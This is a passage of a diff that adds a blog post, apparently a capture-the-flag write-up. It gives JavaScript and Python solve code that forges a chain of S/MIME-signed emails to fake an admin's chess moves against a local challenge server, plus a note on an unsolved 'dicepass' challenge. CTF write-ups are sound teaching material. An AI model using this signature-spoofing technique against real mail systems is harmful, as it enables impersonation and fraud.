+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">email_parsed</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n.\r\n&#34;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`From: &lt;</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">from</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;\r\nTo: &lt;</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">to</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;\r\n</span><span style="color:#e6db74">${</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">subject</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;Subject: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">subject</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">}</span><span style="color:#e6db74">\r\n\r\n</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">data</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\r\n.\r\n`</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">My_SMTP_Client</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">My_SMTP_Client</span>;
+</span></span></code></pre></div><p>And here is the logic of solving the challenge:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">My_SMTP_Client</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;./my_smpt&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">child_process</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2525</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">register_client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">My_SMTP_Client</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">host</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">port</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;testtest@chess&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;register@chess&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Register&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;test&#34;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">register_client</span>
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, (<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// console.log(&#34;Data received:&#34;, data);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">keys</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\r\n\r\n&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#34;private.pem&#34;</span>, <span style="color:#a6e22e">keys</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#34;public.pem&#34;</span>, <span style="color:#a6e22e">keys</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">child_process</span>.<span style="color:#a6e22e">execSync</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;./create_mail.py --from &#39;&lt;testtest@chess&gt;&#39; --to &#39;&lt;admin@chess&gt;&#39; --cert public.pem --key private.pem --out test1.eml --text e4&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">child_process</span>.<span style="color:#a6e22e">execSync</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;./create_mail.py --from &#39;&lt;admin@chess&gt;&#39; --to &#39;&lt;testtest@chess&gt;&#39; --cert public.pem --key private.pem --attach test1.eml --out test2.eml --text f5&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">child_process</span>.<span style="color:#a6e22e">execSync</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;./create_mail.py --from &#39;&lt;testtest@chess&gt;&#39; --to &#39;&lt;admin@chess&gt;&#39; --cert public.pem --key private.pem --attach test2.eml --out test3.eml --text Nc3&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">child_process</span>.<span style="color:#a6e22e">execSync</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;./create_mail.py --from &#39;&lt;admin@chess&gt;&#39; --to &#39;&lt;testtest@chess&gt;&#39; --cert public.pem --key private.pem --attach test3.eml --out test4.eml --text g5&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">child_process</span>.<span style="color:#a6e22e">execSync</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;./create_mail.py --from &#39;&lt;testtest@chess&gt;&#39; --to &#39;&lt;admin@chess&gt;&#39; --cert public.pem --key private.pem --attach test4.eml --out test5.eml --text Qh5&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">play_data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#34;test5.eml&#34;</span>, <span style="color:#e6db74">&#34;utf-8&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// console.log(&#34;play_data&#34;, play_data);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">play_client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">My_SMTP_Client</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">host</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">port</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;testtest@chess&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;admin@chess&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Play&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">play_data</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">play_client</span>
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, (<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Data received:&#34;</span>, <span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;error&#34;</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Error:&#34;</span>, <span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;end&#34;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Connection ended&#34;</span>);
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;error&#34;</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Error:&#34;</span>, <span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;end&#34;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Connection ended&#34;</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span></code></pre></div><p>I think openssl can do this too, but I am not familiar of using openssl so I wrote a simple python script to sign the S/MIME to my liking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> smail
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.mime.multipart <span style="color:#f92672">import</span> MIMEMultipart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.mime.text <span style="color:#f92672">import</span> MIMEText
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.mime.application <span style="color:#f92672">import</span> MIMEApplication
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Send S/MIME signed email with attachment&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--from&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sender&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Sender email address&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--to&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;recipient&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Recipient email address&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--subject&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Email subject&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Test mail&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--text&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Plain text body&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--attach&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Attachment filename&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--cert&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path to cert.pem&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--key&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path to key.pem&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--out&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Output filename&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Build the message</span>
+</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> MIMEMultipart()
+</span></span><span style="display:flex;"><span>    msg[<span style="color:#e6db74">&#34;From&#34;</span>] <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>sender
+</span></span><span style="display:flex;"><span>    msg[<span style="color:#e6db74">&#34;To&#34;</span>] <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>recipient
+</span></span><span style="display:flex;"><span>    msg[<span style="color:#e6db74">&#34;Subject&#34;</span>] <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>subject
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Add text</span>
+</span></span><span style="display:flex;"><span>    msg<span style="color:#f92672">.</span>attach(MIMEText(args<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;plain&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Add attachment</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>attach:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>attach, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                part <span style="color:#f92672">=</span> MIMEText(f<span style="color:#f92672">.</span>read(), <span style="color:#e6db74">&#34;plain&#34;</span>)
+</span></span><span style="display:flex;"><span>                part<span style="color:#f92672">.</span>add_header(<span style="color:#e6db74">&#34;Content-Disposition&#34;</span>, <span style="color:#e6db74">&#34;attachment&#34;</span>, filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;move.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>                msg<span style="color:#f92672">.</span>attach(part)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Attachment file </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>attach<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found.&#34;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>cert, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            cert <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Certificate file </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>cert<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found.&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>key, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Key file </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found.&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    mail <span style="color:#f92672">=</span> smail<span style="color:#f92672">.</span>sign_message(msg, key<span style="color:#f92672">.</span>encode(), cert<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>as_string()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>out, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(mail)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Signed email saved to </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>out<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Run the javascript script would give the flag.</p>
+<h2 id="dicepass">dicepass<a hidden class="anchor" aria-hidden="true" href="#dicepass">#</a></h2>
+<p>I haven&rsquo;t solved this challenge yet, as I am working on the comlink stuff as I think I could get the <code>window.dicepass</code> to return things in the context, I am wondering if I could access other thing beside that.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://blog.bigbluewhale111.me/">bigbluewhale111&#39;s blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
